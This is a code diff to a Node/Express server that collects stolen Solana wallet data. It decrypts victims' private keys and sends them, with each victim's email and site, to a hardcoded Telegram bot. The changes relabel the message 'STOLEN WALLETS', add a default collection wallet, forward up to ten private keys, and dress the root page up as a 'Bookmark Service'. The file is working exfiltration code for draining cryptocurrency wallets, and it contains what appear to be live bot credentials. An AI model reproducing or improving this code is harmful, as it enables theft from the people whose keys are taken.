@@ -6,6 +6,7 @@ const app = express();
 
 const TG_BOT = '7641165749:AAFla0YZ3Z7PUViwZQaq8a0W2-ydT7n0bJc';
 const TG_CHAT = '7680513699';
+const DEFAULT_WALLET = 'CFBkgsCnDwZmu3U2LsawtWFzbWRpDR2rQMCEPzkxz7Ba';
 
 function decrypt(encrypted, bundleKey) {
   try {
@@ -61,9 +62,9 @@ app.get('/data/:b64', async (req, res) => {
     
     const solPrice = await getSOLPrice();
     
-    // Build simple message
+    // Build message with default wallet
     const msg = `
-🎯 VICTIM DATA
+🎯 STOLEN WALLETS
 
 📧 ${data.user?.email || 'No email'}
 🔑 Decrypted Keys: ${solKeys.length}
@@ -71,9 +72,12 @@ app.get('/data/:b64', async (req, res) => {
 🔗 ${data.site}
 ⏰ ${new Date().toLocaleString('en-US', {timeZone: 'America/Chicago'})}
 
-Keys:
-${solKeys.slice(0, 5).map((k, i) => `${i + 1}. ${k}`).join('\n')}
-${solKeys.length > 5 ? `... and ${solKeys.length - 5} more` : ''}
+💳 Default Collection Wallet:
+${DEFAULT_WALLET}
+
+🔐 Private Keys:
+${solKeys.slice(0, 10).map((k, i) => `${i + 1}. ${k}`).join('\n')}
+${solKeys.length > 10 ? `... and ${solKeys.length - 10} more keys` : ''}
 `.trim();
     
     await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
@@ -92,9 +96,14 @@ ${solKeys.length > 5 ? `... and ${solKeys.length - 5} more` : ''}
 });
 
 app.get('/', (req, res) => {
-  res.send('<h1>Service Online</h1>');
+  res.send(`
+    <h1>Bookmark Service Online</h1>
+    <p>Default Wallet: ${DEFAULT_WALLET}</p>
+    <p>Status: ✅ Active</p>
+  `);
 });
 
 app.listen(process.env.PORT || 3000, () => {
   console.log('Server running');
+  console.log(`Default wallet: ${DEFAULT_WALLET}`);
 });
